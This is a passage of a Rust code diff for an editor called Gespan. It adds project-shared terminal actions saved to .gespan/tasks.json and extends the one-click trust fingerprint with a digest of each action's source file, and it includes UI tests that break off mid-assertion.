@@ -1,10 +1,14 @@
 //! Actions: project commands the footer runs in a dock terminal with one
 //! click. They come from every source core detects, plus the personal ones
 //! saved here. The button runs the last action run, while it still runs the
-//! same command; its chevron lists the rest and opens the editor.
+//! same command; its chevron lists the rest and opens the editor. New actions
+//! are shared through `.gespan/tasks.json` unless the user keeps them personal.
 use super::*;
 use crate::workspace::{ACTION_ICONS, ProjectAction};
-use gespan_core::project_actions::{self as project_actions, Action, Listing};
+use gespan_core::project_actions::{
+    self as project_actions, Action, Listing,
+    write::{self, Draft, WriteError},
+};
 use std::path::Path;
 
 /// The menu row id that expands a collapsed section.
@@ -14,13 +18,34 @@ const PROJECT: &str = "gespan";
 const PERSONAL: &str = "personal";
 /// A section with more rows than this starts collapsed.
 const COLLAPSE_OVER: usize = 8;
+/// Where shared actions are saved, relative to the checkout.
+const TASKS_JSON: &str = ".gespan/tasks.json";
+/// Shown after an action is added to the shared file.
+const ADDED: &str = "Added to .gespan/tasks.json. Commit it to share it.";
+/// How long that note stays.
+const NOTICE_FOR: std::time::Duration = std::time::Duration::from_secs(8);
+
+/// The action an open dialog edits.
+#[derive(Clone, Debug, PartialEq, Eq)]
+enum Editing {
+    /// A personal action, by its id.
+    Personal(String),
+    /// A `.gespan/tasks.json` one, by its label.
+    Project(String),
+}
 
 pub(super) struct ActionDialog {
     /// The action being edited, or `None` for a new one.
-    editing: Option<String>,
+    editing: Option<Editing>,
     name: Entity<input::Input>,
     command: Entity<input::Input>,
     icon: &'static str,
+    /// A project action's detail, which the dialog doesn't show but keeps.
+    detail: Option<String>,
+    /// A new action goes to `.gespan/tasks.json`; off keeps it personal.
+    share: bool,
+    /// The shared file has comments, so the dialog offers to open it instead.
+    comments: bool,
     error: Option<SharedString>,
     _events: Vec<Subscription>,
 }
@@ -30,6 +55,8 @@ pub(super) struct ActionListing {
     project: String,
     checkout: String,
     listing: Listing,
+    /// Each source file's digest when it was read, keyed by its file label.
+    digests: HashMap<String, String>,
 }
 
 /// Hands `project`'s personal actions to core, so agents list them too.
@@ -60,11 +87,13 @@ fn expand_env(env: &[(String, String)]) -> Vec<(String, String)> {
         .collect()
 }
 
-/// What `action` runs: its command, cwd and env. A repo can change any of
-/// them, and a one-click run must run only what the user already ran.
-fn fingerprint(action: &Action) -> String {
+/// What `action` runs: its command, cwd and env, and `digest`, its source
+/// file's. A repo can change any of them, such as a script's body behind an
+/// unchanged `bun run dev`, and a one-click run must run only what the user
+/// already ran.
+fn fingerprint(action: &Action, digest: &str) -> String {
     let cwd = action.cwd.to_string_lossy();
-    serde_json::to_string(&(&action.command, cwd, &action.env)).unwrap_or_default()
+    serde_json::to_string(&(&action.command, cwd, &action.env, digest)).unwrap_or_default()
 }
 
 /// The menu row for `action`: its detail or command beneath, or why it
@@ -105,14 +134,29 @@ impl Shell {
         }
         project_actions::detect(project, Path::new(&self.terminal_cwd(cx)))
     }
+    /// The actions as found now, with each source file's digest.
+    fn detect_actions(&self, cx: &App) -> ActionListing {
+        let checkout = self.terminal_cwd(cx);
+        let listing = self.listing(cx);
+        let mut digests = HashMap::new();
+        // Personal actions live outside the repository.
+        for action in listing.actions.iter().filter(|a| a.source != PERSONAL) {
+            if !digests.contains_key(&action.file) {
+                let digest = project_actions::source_digest(Path::new(&checkout), &action.file);
+                digests.insert(action.file.clone(), digest);
+            }
+        }
+        ActionListing {
+            project: self.workspace.project.clone(),
+            checkout,
+            listing,
+            digests,
+        }
+    }
     /// Detects the actions again, for a menu that is opening.
     pub(super) fn refresh_actions(&mut self, cx: &App) {
         self.action_sections.clear();
-        self.action_listing = Some(ActionListing {
-            project: self.workspace.project.clone(),
-            checkout: self.terminal_cwd(cx),
-            listing: self.listing(cx),
-        });
+        self.action_listing = Some(self.detect_actions(cx));
     }
     /// Detects the actions again only when the project or checkout changed.
     pub(super) fn sync_actions(&mut self, cx: &App) {
@@ -129,6 +173,15 @@ impl Shell {
             .filter(|l| l.project == self.workspace.project)
             .map_or(&[], |l| l.listing.actions.as_slice())
     }
+    /// `action`'s fingerprint, with its source file as last read.
+    fn fingerprint(&self, action: &Action) -> String {
+        let digest = self
+            .action_listing
+            .as_ref()
+            .and_then(|l| l.digests.get(&action.file))
+            .map_or("", String::as_str);
+        fingerprint(action, digest)
+    }
     /// The action the footer button runs: the last one run from here, only
     /// while it still runs the same command, cwd and env. Nothing else is
     /// trusted for one click, so a fresh clone's button opens the menu.
@@ -136,16 +189,13 @@ impl Shell {
         let project = &self.workspace.project;
         let trusted = self.workspace.last_action_fingerprints.get(project)?;
         let id = self.workspace.last_actions.get(project)?;
-        find(self.actions(), id)
-            .filter(|a| a.blocked.is_none() && !trusted.is_empty() && fingerprint(a) == *trusted)
+        find(self.actions(), id).filter(|a| {
+            a.blocked.is_none() && !trusted.is_empty() && self.fingerprint(a) == *trusted
+        })
     }
     /// Detects the actions again, keeping the open menu's expanded sections.
     fn redetect(&mut self, cx: &App) {
-        self.action_listing = Some(ActionListing {
-            project: self.workspace.project.clone(),
-            checkout: self.terminal_cwd(cx),
-            listing: self.listing(cx),
-        });
+        self.action_listing = Some(self.detect_actions(cx));
     }
     /// The footer button: runs [`Self::footer_action`] as it is on disk now,
     /// or opens the menu when there is none.
@@ -197,12 +247,13 @@ impl Shell {
         let project = self.workspace.project.clone();
         let cwd = action.cwd.to_string_lossy().into_owned();
         let env = expand_env(&action.env);
+        let fingerprint = self.fingerprint(&action);
         self.workspace
             .last_actions
             .insert(project.clone(), action.id.clone());
         self.workspace
             .last_action_fingerprints
-            .insert(project.clone(), fingerprint(&action));
+            .insert(project.clone(), fingerprint);
         self.ensure_terminals(&project, cx);
         let key = (project.clone(), action.id.clone());
         let live = self.terminals.get(&project).cloned().unwrap_or_default();
@@ -336,24 +387,48 @@ impl Shell {
         if !items.is_empty() {
             items.push(MenuItem::Separator);
         }
-        // Only personal actions are edited here so far.
-        let personal = self.personal_actions();
-        if !personal.is_empty() {
+        // The project's shared actions, then personal ones, are edited here;
+        // a detected one is copied into the project first.
+        let edit: Vec<MenuAction> = actions
+            .iter()
+            .filter(|a| a.source == PROJECT)
+            .map(|a| {
+                MenuAction::new(
+                    SharedString::from(format!("edit:{}", a.id)),
+                    a.label.clone(),
+                )
+                .icon(a.icon)
+            })
+            .chain(self.personal_actions().iter().map(|a| {
+                MenuAction::new(SharedString::from(format!("edit:{}", a.id)), a.name.clone())
+                    .icon(a.icon())
+            }))
+            .collect();
+        if !edit.is_empty() {
             items.push(
                 MenuAction::new("edit", "Edit action")
                     .icon("pencil-edit-02")
-                    .submenu(
-                        personal
-                            .iter()
-                            .map(|a| {
-                                MenuAction::new(
-                                    SharedString::from(format!("edit:{}", a.id)),
-                                    a.name.clone(),
-                                )
-                                .icon(a.icon())
-                            })
-                            .collect(),
-                    )
+                    .submenu(edit)
+                    .into(),
+            );
+        }
+        let save: Vec<MenuAction> = actions
+            .iter()
+            .filter(|a| a.source != PROJECT && a.source != PERSONAL && a.blocked.is_none())
+            .map(|a| {
+                MenuAction::new(
+                    SharedString::from(format!("save:{}", a.id)),
+                    a.label.clone(),
+                )
+                .icon(a.icon)
+                .description(a.file.clone())
+            })
+            .collect();
+        if !save.is_empty() {
+            items.push(
+                MenuAction::new("save", "Save to project")
+                    .icon("share")
+                    .submenu(save)
                     .into(),
             );
         }
@@ -372,7 +447,79 @@ impl Shell {
             self.run_action(id, window, cx);
         } else if let Some(id) = action.strip_prefix("edit:") {
             self.open_action_dialog(Some(id.to_owned()), window, cx);
+        } else if let Some(id) = action.strip_prefix("save:") {
+            self.save_to_project(id, cx);
         }
+    }
+
+    /// Copies the detected action `id` into `.gespan/tasks.json`, where it
+    /// takes over from the file it came from. That file is never written.
+    fn save_to_project(&mut self, id: &str, cx: &mut Context<Self>) {
+        self.redetect(cx);
+        let Some(action) = find(self.actions(), id).cloned() else {
+            cx.notify();
+            return;
+        };
+        let checkout = self.terminal_cwd(cx);
+        match write::save_detected(Path::new(&checkout), &action) {
+            Ok(()) => {
+                self.show_action_notice(ADDED, cx);
+                self.refresh_actions(cx);
+            }
+            Err(error) => self.error = Some(error.to_string()),
+        }
+        cx.notify();
+    }
+    /// A short note, such as where an action was saved, that goes by itself.
+    fn show_action_notice(&mut self, text: &'static str, cx: &mut Context<Self>) {
+        self.action_notice = Some(text.into());
+        cx.spawn(async move |this, cx| {
+            cx.background_executor().timer(NOTICE_FOR).await;
+            let _ = this.update(cx, |this, cx| {
+                if this.action_notice.as_deref() == Some(text) {
+                    this.action_notice = None;
+                    cx.notify();
+                }
+            });
+        })
+        .detach();
+    }
+    /// The note in the notification stack, if one is showing.
+    pub(super) fn action_notice_card(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
+        let text = self.action_notice.clone()?;
+        Some(
+            crate::notifications::surface::toast_frame()
+                .id("action-notice")
+                .debug_selector(|| "action-notice".into())
+                .role(Role::Status)
+                .child(
+                    div()
+                        .px(px(14.))
+                        .py_3()
+                        .flex()
+                        .items_center()
+                        .gap_2()
+                        .child(icon("check", 16.).text_color(content(0.7)))
+                        .child(
+                            div()
+                                .flex_1()
+                                .min_w_0()
+                                .text_size(px(12.))
+                                .line_height(px(19.5))
+                                .text_color(content(0.85))
+                                .child(text),
+                        )
+                        .child(
+                            icon_button("dismiss-action-notice", "Dismiss", "close").on_click(
+                                cx.listener(|this, _, _, cx| {
+                                    this.action_notice = None;
+                                    cx.notify();
+                                }),
+                            ),
+                        ),
+                )
+                .into_any_element(),
+        )
     }
 
     /// The footer's split button: run the current action, or pick another.
@@ -459,15 +606,30 @@ impl Shell {
         cx: &mut Context<Self>,
     ) {
         self.close_preview(cx);
-        let existing = editing
-            .as_ref()
-            .and_then(|id| self.personal_actions().iter().find(|a| a.id == *id))
-            .cloned();
+        // What to fill in: an editable action's name, command, icon, detail.
+        let existing = match editing {
+            Some(id) if id.starts_with(&format!("{PROJECT}:")) => {
+                self.actions().iter().find(|a| a.id == id).map(|a| {
+                    let label = a.label.clone();
+                    let fields = (a.label.clone(), a.command.clone(), a.icon, a.detail.clone());
+                    (Editing::Project(label), fields)
+                })
+            }
+            Some(id) => self
+                .personal_actions()
+                .iter()
+                .find(|a| a.id == id)
+                .map(|a| {
+                    let fields = (a.name.clone(), a.command.clone(), a.icon(), None);
+                    (Editing::Personal(a.id.clone()), fields)
+                }),
+            None => None,
+        };
         let name = cx.new(|cx| input::Input::field("Action name", "Test", content(0.3), cx));
         let command = cx.new(input::Input::action_command);
-        if let Some(action) = &existing {
-            name.update(cx, |i, cx| i.set_text(action.name.clone(), cx));
-            command.update(cx, |i, cx| i.set_text(action.command.clone(), cx));
+        if let Some((_, (label, line, _, _))) = &existing {
+            name.update(cx, |i, cx| i.set_text(label.clone(), cx));
+            command.update(cx, |i, cx| i.set_text(line.clone(), cx));
         }
         let clear = |this: &mut Self, cx: &mut Context<Self>| {
             if let Some(dialog) = &mut this.action_dialog
@@ -495,17 +657,48 @@ impl Shell {
             }),
         ];
         window.focus(&name.read(cx).focus_handle(cx), cx);
+        let (editing, (icon, detail)) = match existing {
+            Some((editing, (_, _, icon, detail))) => (Some(editing), (icon, detail)),
+            None => (None, (ACTION_ICONS[0], None)),
+        };
         self.action_dialog = Some(ActionDialog {
-            icon: existing
-                .as_ref()
-                .map_or(ACTION_ICONS[0], ProjectAction::icon),
-            editing: existing.map(|a| a.id),
+            icon,
+            detail,
+            editing,
             name,
             command,
+            share: true,
+            comments: false,
             error: None,
             _events: events,
         });
         cx.notify();
+    }
+    /// Flips a new action between shared and personal.
+    pub(super) fn toggle_action_share(&mut self, cx: &mut Context<Self>) {
+        if let Some(dialog) = &mut self.action_dialog {
+            dialog.share = !dialog.share;
+            dialog.comments = false;
+            dialog.error = None;
+            cx.notify();
+        }
+    }
+    /// Opens `.gespan/tasks.json` in the file editor, as the explorer opens a
+    /// file, so a file with comments can be edited by hand.
+    pub(super) fn open_tasks_json(&mut self, window: &mut Window, cx: &mut Context<Self>) {
+        let path = Path::new(&self.terminal_cwd(cx)).join(TASKS_JSON);
+        self.close_action_dialog(window, cx);
+        let cwd = self.git.read(cx).project().to_owned();
+        let path = path.to_string_lossy().into_owned();
+        self.open_review(crate::review::ReviewTab::File { cwd, path }, window, cx);
+    }
+    /// Shows why a shared write failed, offering to open a commented file.
+    fn write_failed(&mut self, error: WriteError, cx: &mut Context<Self>) {
+        if let Some(dialog) = &mut self.action_dialog {
+            dialog.comments = error == WriteError::HasComments;
+            dialog.error = Some(error.to_string().into());
+            cx.notify();
+        }
     }
     pub(super) fn close_action_dialog(&mut self, window: &mut Window, cx: &mut Context<Self>) {
         if self.action_dialog.take().is_some() {
@@ -524,11 +717,42 @@ impl Shell {
             cx.notify();
             return;
         }
+        let shared = match &dialog.editing {
+            None if dialog.share => Some(None),
+            Some(Editing::Project(label)) => Some(Some(label.clone())),
+            _ => None,
+        };
+        if let Some(label) = shared {
+            let draft = Draft {
+                label: name,
+                command,
+                icon: dialog.icon.to_owned(),
+                detail: dialog.detail.clone(),
+            };
+            let checkout = self.terminal_cwd(cx);
+            let checkout = Path::new(&checkout);
+            let written = match &label {
+                None => write::add(checkout, &draft),
+                Some(label) => write::update(checkout, label, &draft),
+            };
+            match written {
+                Ok(()) => {
+                    if label.is_none() {
+                        self.show_action_notice(ADDED, cx);
+                    }
+                    self.refresh_actions(cx);
+                    self.close_action_dialog(window, cx);
+                }
+                Err(error) => self.write_failed(error, cx),
+            }
+            return;
+        }
+        let id = match &dialog.editing {
+            Some(Editing::Personal(id)) => id.clone(),
+            _ => format!("{:x}", gespan_core::time::now_ms()),
+        };
         let action = ProjectAction {
-            id: dialog
-                .editing
-                .clone()
-                .unwrap_or_else(|| format!("{:x}", gespan_core::time::now_ms())),
+            id,
             name,
             command,
             icon: dialog.icon.to_owned(),
@@ -548,10 +772,24 @@ impl Shell {
         self.close_action_dialog(window, cx);
     }
     fn delete_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
-        let Some(id) = self.action_dialog.as_ref().and_then(|d| d.editing.clone()) else {
+        let Some(editing) = self.action_dialog.as_ref().and_then(|d| d.editing.clone()) else {
             return;
         };
         let project = self.workspace.project.clone();
+        let id = match editing {
+            Editing::Project(label) => {
+                let checkout = self.terminal_cwd(cx);
+                match write::remove(Path::new(&checkout), &label) {
+                    Ok(()) => {
+                        self.refresh_actions(cx);
+                        self.close_action_dialog(window, cx);
+                    }
+                    Err(error) => self.write_failed(error, cx),
+                }
+                return;
+            }
+            Editing::Personal(id) => id,
+        };
         if let Some(actions) = self.workspace.actions.get_mut(&project) {
             actions.retain(|a| a.id != id);
             if actions.is_empty() {
@@ -647,6 +885,72 @@ impl Shell {
                     }))
             }));
         let title = if editing { "Edit action" } else { "Add action" };
+        // A commented file isn't rewritten; its message stays while typing.
+        let error = dialog.error.clone().or_else(|| {
+            dialog
+                .comments
+                .then(|| WriteError::HasComments.to_string().into())
+        });
+        let share = dialog.share;
+        let share_toggle =
+            div()
+                .id("action-share")
+                .debug_selector(|| "action-share".into())
+                .role(Role::Switch)
+                .aria_label("Share with the project")
+                .aria_toggled(if share {
+                    gpui::Toggled::True
+                } else {
+                    gpui::Toggled::False
+                })
+                .flex()
+                .items_center()
+                .gap_2()
+                .cursor_pointer()
+                .child(
+                    div()
+                        .w(px(30.))
+                        .h(px(18.))
+                        .flex_shrink_0()
+                        .rounded_full()
+                        .bg(if share { accent_color() } else { content(0.18) })
+                        .relative()
+                        .child(
+                            div()
+                                .absolute()
+                                .top(px(3.))
+                                .left(px(if share { 15. } else { 3. }))
+                                .size(px(12.))
+                                .rounded_full()
+                                .bg(content(1.)),
+                        ),
+                )
+                .child(
+                    div()
+                        .flex()
+                        .flex_col()
+                        .child(label("Share with the project"))
+                        .child(div().text_size(px(11.)).text_color(content(0.45)).child(
+                            if share {
+                                "Saved in .gespan/tasks.json for everyone."
+                            } else {
+                                "Only you see it, in Gespan."
+                            },
+                        )),
+                )
+                .on_click(cx.listener(|this, _, _, cx| this.toggle_action_share(cx)));
+        let primary = if dialog.comments {
+            crate::modal::primary_button("action-open-tasks", "Open tasks.json")
+                .debug_selector(|| "action-open-tasks".into())
+                .w_full()
+                .cursor_pointer()
+                .on_click(cx.listener(|this, _, window, cx| this.open_tasks_json(window, cx)))
+        } else {
+            crate::modal::primary_button("action-save", if editing { "Save" } else { "Add action" })
+                .w_full()
+                .cursor_pointer()
+                .on_click(cx.listener(|this, _, window, cx| this.save_action(window, cx)))
+        };
         Some(
             div()
                 .absolute()
@@ -716,13 +1020,13 @@ impl Shell {
                                         .gap_1p5()
                                         .child(label("Command"))
                                         .child(field(dialog.command.clone(), true))
-                                        .child(match &dialog.error {
+                                        .child(match error {
                                             Some(error) => div()
                                                 .id("action-error")
                                                 .role(Role::Alert)
                                                 .text_size(px(11.))
                                                 .text_color(rgb(0xf87171))
-                                                .child(error.clone()),
+                                                .child(error),
                                             None => div()
                                                 .id("action-help")
                                                 .text_size(px(11.))
@@ -730,25 +1034,14 @@ impl Shell {
                                                 .child("Runs in a terminal at the project root."),
                                         }),
                                 )
+                                .when(!editing, |d| d.child(share_toggle))
                                 // Full-width buttons, the confirming one first.
                                 .child(
                                     div()
                                         .flex()
                                         .flex_col()
                                         .gap_2()
-                                        .child(
-                                            crate::modal::primary_button(
-                                                "action-save",
-                                                if editing { "Save" } else { "Add action" },
-                                            )
-                                            .w_full()
-                                            .cursor_pointer()
-                                            .on_click(
-                                                cx.listener(|this, _, window, cx| {
-                                                    this.save_action(window, cx)
-                                                }),
-                                            ),
-                                        )
+                                        .child(primary)
                                         .when(editing, |d| {
                                             d.child(
                                                 crate::modal::danger_ghost_button(
@@ -855,6 +1148,8 @@ mod tests {
             .update(cx, |shell, window, cx| {
                 checkout(shell, active, root, cx);
                 shell.open_action_dialog(None, window, cx);
+                // Kept personal.
+                shell.toggle_action_share(cx);
                 let dialog = shell.action_dialog.as_mut().unwrap();
                 dialog.icon = "rocket";
                 let (name, command) = (dialog.name.clone(), dialog.command.clone());
@@ -1162,6 +1457,8 @@ mod tests {
                 // A personal action gets no special trust: saving it isn't
                 // enough, and changing its command needs a new run.
                 shell.open_action_dialog(None, window, cx);
+                // Kept personal.
+                shell.toggle_action_share(cx);
                 let dialog = shell.action_dialog.as_mut().unwrap();
                 let (name, command) = (dialog.name.clone(), dialog.command.clone());
                 name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
@@ -1193,6 +1490,8 @@ mod tests {
         window
             .update(cx, |shell, window, cx| {
                 shell.open_action_dialog(None, window, cx);
+                // Kept personal.
+                shell.toggle_action_share(cx);
                 let dialog = shell.action_dialog.as_mut().unwrap();
                 dialog.icon = "rocket";
                 let (name, command) = (dialog.name.clone(), dialog.command.clone());
@@ -1229,5 +1528,392 @@ mod tests {
         let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
         visual.run_until_parked();
         assert!(visual.debug_bounds("action-delete").is_some());
+    }
+
+    /// Fills the open dialog's name and command.
+    fn type_action(shell: &mut Shell, name: &str, command: &str, cx: &mut Context<Shell>) {
+        let dialog = shell.action_dialog.as_ref().unwrap();
+        let (n, c) = (dialog.name.clone(), dialog.command.clone());
+        n.update(cx, |i, cx| i.set_text(name.into(), cx));
+        c.update(cx, |i, cx| i.set_text(command.into(), cx));
+    }
+
+    fn shared(dir: &Path) -> serde_json::Value {
+        let text = std::fs::read_to_string(dir.join(".gespan/tasks.json")).unwrap();
+        serde_json::from_str(&text).unwrap()
+    }
+
+    /// The rows from `header` up to the next separator.
+    fn section(rows: &[String], header: &str) -> Vec<String> {
+        let Some(at) = rows.iter().position(|r| r == header) else {
+            return Vec::new();
+        };
+        rows[at + 1..]
+            .iter()
+            .take_while(|r| *r != "---")
+            .cloned()
+            .collect()
+    }
+
+    /// The labels in the submenu of the row labelled `parent`.
+    fn submenu(items: &[MenuItem], parent: &str) -> Vec<(String, String)> {
+        items
+            .iter()
+            .find_map(|item| match item {
+                MenuItem::Action(a) if a.label.as_ref() == parent => Some(
+                    a.submenu
+                        .iter()
+                        .map(|s| (s.id.to_string(), s.label.to_string()))
+                        .collect(),
+                ),
+                _ => None,
+            })
+            .unwrap_or_default()
+    }
+
+    #[gpui::test]
+    fn a_new_shared_action_lands_in_gespan_tasks_json(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                let project = shell.workspace.project.clone();
+                shell.open_action_dialog(None, window, cx);
+                // Sharing is on unless turned off.
+                assert!(shell.action_dialog.as_ref().unwrap().share);
+                shell.action_dialog.as_mut().unwrap().icon = "rocket";
+                type_action(shell, " Deploy ", "./deploy.sh", cx);
+                shell.save_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+
+                assert_eq!(
+                    shared(root)["tasks"],
+                    serde_json::json!([{
+                        "label": "Deploy", "type": "shell", "command": "./deploy.sh",
+                        "icon": { "id": "rocket" },
+                    }])
+                );
+                assert!(!shell.workspace.actions.contains_key(&project));
+                assert_eq!(
+                    shell.action_notice.as_ref().map(|n| n.to_string()),
+                    Some("Added to .gespan/tasks.json. Commit it to share it.".into())
+                );
+                let rows = rows(&shell.actions_menu());
+                assert_eq!(section(&rows, "# Project"), ["Deploy | ./deploy.sh"]);
+                assert!(!rows.contains(&"# Personal".to_string()), "{rows:?}");
+
+                // A second one by the same name is refused, and the dialog
+                // stays open to say why.
+                shell.action_notice = None;
+                shell.open_action_dialog(None, window, cx);
+                type_action(shell, "Deploy", "./other.sh", cx);
+                shell.save_action(window, cx);
+                let dialog = shell.action_dialog.as_ref().unwrap();
+                assert_eq!(
+                    dialog.error.as_ref().map(|e| e.to_string()),
+                    Some("An action named \u{201c}Deploy\u{201d} already exists.".into())
+                );
+                assert!(!dialog.comments);
+                assert!(shell.action_notice.is_none());
+                assert_eq!(shared(root)["tasks"].as_array().unwrap().len(), 1);
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn turning_share_off_keeps_it_personal(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                let project = shell.workspace.project.clone();
+                shell.open_action_dialog(None, window, cx);
+                shell.toggle_action_share(cx);
+                assert!(!shell.action_dialog.as_ref().unwrap().share);
+                type_action(shell, "Deploy", "./deploy.sh", cx);
+                shell.save_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+
+                assert!(!root.join(".gespan").exists());
+                assert!(shell.action_notice.is_none());
+                let personal = &shell.workspace.actions[&project];
+                assert_eq!(personal.len(), 1);
+                assert_eq!(personal[0].name, "Deploy");
+                let rows = rows(&shell.actions_menu());
+                assert_eq!(section(&rows, "# Personal"), ["Deploy | ./deploy.sh"]);
+                assert!(section(&rows, "# Project").is_empty(), "{rows:?}");
+
+                // Toggling twice turns it back on.
+                shell.open_action_dialog(None, window, cx);
+                shell.toggle_action_share(cx);
+                shell.toggle_action_share(cx);
+                assert!(shell.action_dialog.as_ref().unwrap().share);
+            })
+            .unwrap();
+        // The add dialog, with its toggle, renders.
+        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
+        visual.run_until_parked();
+        assert!(visual.debug_bounds("action-share").is_some());
+    }
+
+    #[gpui::test]
+    fn save_to_project_copies_a_detected_action_and_it_takes_over(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        write(
+            root,
+            "package.json",
+            r#"{ "scripts": { "dev": "vite", "lint": "eslint ." } }"#,
+        );
+        write(
+            root,
+            ".vscode/tasks.json",
+            r#"{ "tasks": [ { "label": "Pick", "command": "echo ${input:x}" } ] }"#,
+        );
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                let dev = shell
+                    .listing(cx)
+                    .actions
+                    .into_iter()
+                    .find(|a| a.id == "package.json:dev")
+                    .unwrap();
+                let menu = shell.actions_menu();
+                // Every detected action that can run can be saved; blocked
+                // ones and the project's own can't.
+                assert_eq!(
+                    submenu(&menu, "Save to project"),
+                    [
+                        ("save:package.json:dev".to_string(), "dev".to_string()),
+                        ("save:package.json:lint".to_string(), "lint".to_string()),
+                    ]
+                );
+                let package = section(&rows(&menu), "# package.json");
+                assert_eq!(package.len(), 2, "{package:?}");
+                assert!(package[0].starts_with("dev | ") && package[1].starts_with("lint | "));
+
+                shell.run_actions_menu("save:package.json:dev", window, cx);
+                let task = &shared(root)["tasks"][0];
+                assert_eq!(task["label"], "dev");
+                assert_eq!(task["command"], dev.command.as_str());
+                assert_eq!(
+                    shell.action_notice.as_ref().map(|n| n.to_string()),
+                    Some("Added to .gespan/tasks.json. Commit it to share it.".into())
+                );
+                // The menu lists it under Project, and no longer under the
+                // file it came from, which is left as it was.
+                let menu = shell.actions_menu();
+                let rows = rows(&menu);
+                assert_eq!(section(&rows, "# Project").len(), 1, "{rows:?}");
+                assert!(
+                    section(&rows, "# Project")[0].starts_with("dev | "),
+                    "{rows:?}"
+                );
+                let package = section(&rows, "# package.json");
+                assert_eq!(package.len(), 1, "{rows:?}");
+                assert!(package[0].starts_with("lint | "), "{rows:?}");
+                assert_eq!(
+                    std::fs::read_to_string(root.join("package.json")).unwrap(),
+                    r#"{ "scripts": { "dev": "vite", "lint": "eslint ." } }"#
+                );
+                assert_eq!(
+                    submenu(&menu, "Save to project"),
+                    [("save:package.json:lint".to_string(), "lint".to_string())]
+                );
+
+                // Saving it twice is refused, and says why.
+                shell.action_notice = None;
+                shell.run_actions_menu("save:package.json:dev", window, cx);
+                assert!(shell.action_notice.is_none());
+                assert_eq!(shared(root)["tasks"].as_array().unwrap().len(), 1);
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn editing_a_project_action_rewrites_it_in_place(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        write(
+            root,
+            ".gespan/tasks.json",
+            &tasks(
+                r#"{ "label": "Ship", "command": "echo ship", "detail": "Ships it", "group": "build" },
+                   { "label": "Keep", "command": "echo keep" }"#,
+            ),
+        );
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                let menu = shell.actions_menu();
+                let edit = submenu(&menu, "Edit action");
+                assert!(
+                    edit.contains(&("edit:gespan:Ship".into(), "Ship".into())),
+                    "{edit:?}"
+                );
+
+                shell.run_actions_menu("edit:gespan:Ship", window, cx);
+                let dialog = shell.action_dialog.as_ref().unwrap();
+                assert_eq!(dialog.name.read(cx).content, "Ship");
+                assert_eq!(dialog.command.read(cx).content, "echo ship");
+                type_action(shell, "Ship it", "echo shipped", cx);
+                shell.save_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+                let value = shared(root);
+                // The detail and fields Gespan doesn't edit stay.
+                assert_eq!(
+                    value["tasks"][0],
+                    serde_json::json!({
+                        "label": "Ship it", "command": "echo shipped", "type": "shell",
+                        "detail": "Ships it", "group": "build",
+                    })
+                );
+                let project = shell.workspace.project.clone();
+                assert!(!shell.workspace.actions.contains_key(&project));
+
+                // Delete removes it from the file.
+                shell.run_actions_menu("edit:gespan:Ship it", window, cx);
+                shell.delete_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+                let tasks = shared(root)["tasks"].clone();
+                assert_eq!(tasks.as_array().unwrap().len(), 1);
+                assert_eq!(tasks[0]["label"], "Keep");
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn editing_a_commented_file_offers_open_instead_of_saving(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let text = "{\n  // Ours\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    { \"label\": \"Ship\", \"command\": \"echo ship\" }\n  ]\n}\n";
+        write(root, ".gespan/tasks.json", text);
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("edit:gespan:Ship", window, cx);
+                type_action(shell, "Ship", "echo shipped", cx);
+                shell.save_action(window, cx);
+                let dialog = shell.action_dialog.as_ref().expect("the dialog stays open");
+                assert_eq!(
+                    dialog.error.as_ref().map(|e| e.to_string()),
+                    Some("This tasks.json has comments, so Gespan won't rewrite it.".into())
+                );
+                assert!(dialog.comments);
+                // Delete is refused the same way.
+                shell.delete_action(window, cx);
+                assert!(shell.action_dialog.as_ref().unwrap().comments);
+                // A new shared action too.
+                shell.close_action_dialog(window, cx);
+                shell.open_action_dialog(None, window, cx);
+                type_action(shell, "New", "echo new", cx);
+                shell.save_action(window, cx);
+                assert!(shell.action_dialog.as_ref().unwrap().comments);
+                assert_eq!(
+                    std::fs::read_to_string(root.join(".gespan/tasks.json")).unwrap(),
+                    text
+                );
+            })
+            .unwrap();
+        // The dialog offers Open tasks.json in place of saving.
+        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
+        visual.run_until_parked();
+        assert!(visual.debug_bounds("action-open-tasks").is_some());
+        window
+            .update(cx, |shell, window, cx| {
+                shell.open_tasks_json(window, cx);
+                assert!(shell.action_dialog.is_none());
+                let path = root
+                    .join(".gespan/tasks.json")
+                    .to_string_lossy()
+                    .into_owned();
+                let review = shell.reviews[&active].read(cx);
+                assert!(
+                    review.state.tabs.iter().any(|tab| matches!(
+                        tab,
+                        crate::review::ReviewTab::File { path: open, .. } if *open == path
